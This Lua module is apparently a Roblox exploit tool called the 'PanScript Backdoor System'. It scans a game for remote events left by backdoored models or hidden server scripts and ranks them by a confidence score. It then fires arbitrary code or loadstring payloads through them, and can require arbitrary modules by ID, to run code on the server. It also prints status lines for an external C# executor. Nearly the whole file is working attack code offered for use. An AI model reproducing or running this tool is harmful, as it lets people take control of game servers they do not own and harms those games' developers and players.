local BackdoorSystem = {}
BackdoorSystem.Active = false
BackdoorSystem.FoundRemotes = {}
BackdoorSystem.InfectedModels = {}
BackdoorSystem.LogCallback = nil
BackdoorSystem.LastScanTime = 0

-- Suspicious patterns for detection
local SuspiciousPatterns = {
    "Insert", "Loadstring", "HttpGet", "Run", "Execute", "Script", 
    "Source", "Require", "Module", "Load", "Eval", "RunCode",
    "HDAdmin", "Kohl", "Admin", "Ban", "Kick", "Remote",
    "GetAsync", "PostAsync", "Request", "Fetch", "Import",
    "Backdoor", "Exploit", "Virus", "Infect", "Spread",
    "getfenv", "setfenv", "loadstring", "require"
}

-- Services to scan
local ScanServices = {
    "ReplicatedStorage", "ReplicatedFirst", "StarterGui", 
    "StarterPack", "StarterPlayer", "Workspace"
}

-- Utility functions
local function Log(msg, msgType)
    msgType = msgType or "INFO"
    if BackdoorSystem.LogCallback then
        BackdoorSystem.LogCallback(msg, msgType)
    end
    print(string.format("[BACKDOOR:%s] %s", msgType, msg))
end

local function IsSuspicious(name)
    if not name then return false end
    name = tostring(name):lower()
    for _, pattern in ipairs(SuspiciousPatterns) do
        if name:find(pattern:lower()) then
            return true
        end
    end
    return false
end

-- Scan instance recursively
local function ScanInstance(instance, depth)
    depth = depth or 0
    if depth > 15 then return {} end
    
    local remotes = {}
    
    if instance:IsA("RemoteEvent") or instance:IsA("RemoteFunction") then
        local isSuspicious = IsSuspicious(instance.Name)
        local parent = instance.Parent
        local parentSuspicious = parent and IsSuspicious(parent.Name)
        
        table.insert(remotes, {
            Object = instance,
            Name = instance.Name,
            Type = instance.ClassName,
            Path = instance:GetFullName(),
            Suspicious = isSuspicious or parentSuspicious,
            Parent = parent,
            Depth = depth
        })
    end
    
    for _, child in ipairs(instance:GetChildren()) do
        local childRemotes = ScanInstance(child, depth + 1)
        for _, r in ipairs(childRemotes) do
            table.insert(remotes, r)
        end
    end
    
    return remotes
end

-- Test remote vulnerability
local function TestRemote(remoteData)
    local remote = remoteData.Object
    local isVulnerable = false
    local executionMethod = nil
    local confidence = 0
    
    -- Check name patterns
    if remoteData.Suspicious then
        isVulnerable = true
        executionMethod = "suspicious_name"
        confidence = confidence + 50
    end
    
    -- Check parent
    local parent = remote.Parent
    if parent then
        local parentName = tostring(parent.Name):lower()
        if parentName:find("backdoor") or parentName:find("exploit") or 
           parentName:find("virus") or parentName:find("infect") or
           parentName:find("admin") then
            isVulnerable = true
            executionMethod = executionMethod or "infected_parent"
            confidence = confidence + 30
        end
        
        -- Check for infected models
        if parent:IsA("Model") or parent:IsA("Folder") then
            for _, desc in ipairs(parent:GetDescendants()) do
                if desc:IsA("Script") or desc:IsA("LocalScript") or desc:IsA("ModuleScript") then
                    local scriptName = tostring(desc.Name)
                    if scriptName:sub(1, 1) == "\0" or 
                       scriptName:match("^%s") or
                       scriptName:find("\239\191\189") or -- Replacement character
                       desc.Archivable == false then
                        isVulnerable = true
                        executionMethod = executionMethod or "hidden_script"
                        remoteData.InfectedModel = parent
                        remoteData.HiddenScript = desc
                        confidence = confidence + 40
                        table.insert(BackdoorSystem.InfectedModels, parent)
                        break
                    end
                end
            end
        end
    end
    
    -- Check if remote has been fired recently (indicates activity)
    if remote:IsA("RemoteEvent") then
        -- Try to detect if it's a known backdoor by checking attributes
        if remote:GetAttribute("Backdoor") or remote:GetAttribute("Exploit") then
            isVulnerable = true
            executionMethod = executionMethod or "marked_attribute"
            confidence = confidence + 100
        end
    end
    
    return isVulnerable, executionMethod, confidence
end

-- Scan for infected models separately
local function ScanInfectedModels()
    local infected = {}
    
    local function ScanContainer(container)
        for _, obj in ipairs(container:GetChildren()) do
            if obj:IsA("Model") or obj:IsA("Folder") or obj:IsA("Part") then
                -- Deep scan for hidden scripts
                for _, desc in ipairs(obj:GetDescendants()) do
                    if desc:IsA("Script") and desc.RunContext == Enum.RunContext.Server then
                        local name = tostring(desc.Name)
                        -- Detect obfuscated/hidden names
                        if #name > 50 or 
                           name:find("[\128-\255]") or -- Non-ASCII
                           name:match("^%s+$") or -- Whitespace only
                           desc.Name == "" or
                           desc.Archivable == false then
                            table.insert(infected, {
                                Model = obj,
                                Script = desc,
                                Reason = "hidden_server_script"
                            })
                            Log(string.format("Infected model detected: %s", obj:GetFullName()), "DETECTED")
                            break
                        end
                    end
                end
                ScanContainer(obj)
            end
        end
    end
    
    ScanContainer(workspace)
    ScanContainer(game:GetService("ReplicatedStorage"))
    
    return infected
end

-- Main scan function
function BackdoorSystem.Scan()
    Log("Starting comprehensive backdoor scan...", "SCAN")
    BackdoorSystem.FoundRemotes = {}
    BackdoorSystem.InfectedModels = {}
    BackdoorSystem.LastScanTime = tick()
    
    local allRemotes = {}
    
    -- Scan all services
    for _, serviceName in ipairs(ScanServices) do
        local success, service = pcall(function()
            return game:GetService(serviceName)
        end)
        if success and service then
            local remotes = ScanInstance(service)
            for _, r in ipairs(remotes) do
                table.insert(allRemotes, r)
            end
        end
    end
    
    Log(string.format("Scanned %d services, found %d remotes", #ScanServices, #allRemotes), "SCAN")
    
    -- Test each remote
    local vulnerableCount = 0
    for _, remoteData in ipairs(allRemotes) do
        local isVuln, method, confidence = TestRemote(remoteData)
        if isVuln then
            remoteData.ExecutionMethod = method
            remoteData.Vulnerable = true
            remoteData.Confidence = confidence
            table.insert(BackdoorSystem.FoundRemotes, remoteData)
            vulnerableCount = vulnerableCount + 1
            Log(string.format("VULNERABLE [%d%%]: %s [%s] via %s", 
                confidence, remoteData.Path, remoteData.Type, method), "FOUND")
        end
    end
    
    -- Scan for infected models
    local infectedModels = ScanInfectedModels()
    for _, inf in ipairs(infectedModels) do
        table.insert(BackdoorSystem.InfectedModels, inf)
    end
    
    Log(string.format("Scan complete. Found %d vulnerable remotes, %d infected models", 
        vulnerableCount, #infectedModels), "SCAN")
    
    return vulnerableCount > 0
end

-- Execute through backdoor
function BackdoorSystem.Execute(code)
    if not BackdoorSystem.Active then
        Log("Backdoor not active", "ERROR")
        return false
    end
    
    if #BackdoorSystem.FoundRemotes == 0 then
        Log("No vulnerable remotes available", "ERROR")
        return false
    end
    
    Log("Executing payload through backdoor...", "EXEC")
    
    -- Sort by confidence (highest first)
    table.sort(BackdoorSystem.FoundRemotes, function(a, b)
        return (a.Confidence or 0) > (b.Confidence or 0)
    end)
    
    for _, remoteData in ipairs(BackdoorSystem.FoundRemotes) do
        local success, result = pcall(function()
            local remote = remoteData.Object
            
            if remoteData.Type == "RemoteEvent" then
                -- Try different payload formats based on detection method
                if remoteData.ExecutionMethod == "infected_parent" then
                    remote:FireServer("loadstring", code)
                elseif remoteData.ExecutionMethod == "hidden_script" then
                    remote:FireServer({code = code, type = "execute"})
                else
                    remote:FireServer(code)
                end
            elseif remoteData.Type == "RemoteFunction" then
                remote:InvokeServer(code)
            end
            
            return true
        end)
        
        if success then
            Log(string.format("Success via: %s", remoteData.Path), "SUCCESS")
            return true
        else
            Log(string.format("Failed on %s: %s", remoteData.Path, tostring(result)), "WARN")
        end
    end
    
    return false
end

-- Execute require through backdoor
function BackdoorSystem.Require(moduleId)
    if type(moduleId) == "number" then
        moduleId = tostring(moduleId)
    end
    
    local requireCode = string.format([[
        local success, result = pcall(function()
            local mod = require(%s)
            if type(mod) == "function" then
                return mod()
            end
            return mod
        end)
        if success then
            print("[BACKDOOR] Module loaded: " .. tostring(result))
            return result
        else
            warn("[BACKDOOR] Module failed: " .. tostring(result))
        end
    ]], moduleId)
    
    return BackdoorSystem.Execute(requireCode)
end

-- Initialize system
function BackdoorSystem.Initialize(callback)
    BackdoorSystem.LogCallback = callback
    Log("PanScript Backdoor System initialized", "INIT")
    return BackdoorSystem
end

-- Activate backdoor
function BackdoorSystem.Activate()
    if #BackdoorSystem.FoundRemotes > 0 then
        BackdoorSystem.Active = true
        -- Print notification for C# to detect
        print("PANS_BACKDOOR_ACTIVE:" .. #BackdoorSystem.FoundRemotes)
        for _, remote in ipairs(BackdoorSystem.FoundRemotes) do
            print("PANS_BACKDOOR_REMOTE:" .. remote.Path .. ":" .. remote.Type .. ":" .. (remote.ExecutionMethod or "unknown"))
        end
        Log("Backdoor activated successfully", "ACTIVE")
        return true
    else
        Log("Cannot activate: No vulnerable remotes", "ERROR")
        return false
    end
end

-- Get status
function BackdoorSystem.GetStatus()
    return {
        Active = BackdoorSystem.Active,
        RemoteCount = #BackdoorSystem.FoundRemotes,
        InfectedModels = #BackdoorSystem.InfectedModels,
        ScanTime = BackdoorSystem.LastScanTime,
        Remotes = BackdoorSystem.FoundRemotes
    }
end

-- Auto-detect and report
function BackdoorSystem.AutoDetect()
    if BackdoorSystem.Scan() then
        BackdoorSystem.Activate()
        return true
    end
    return false
end

return BackdoorSystem
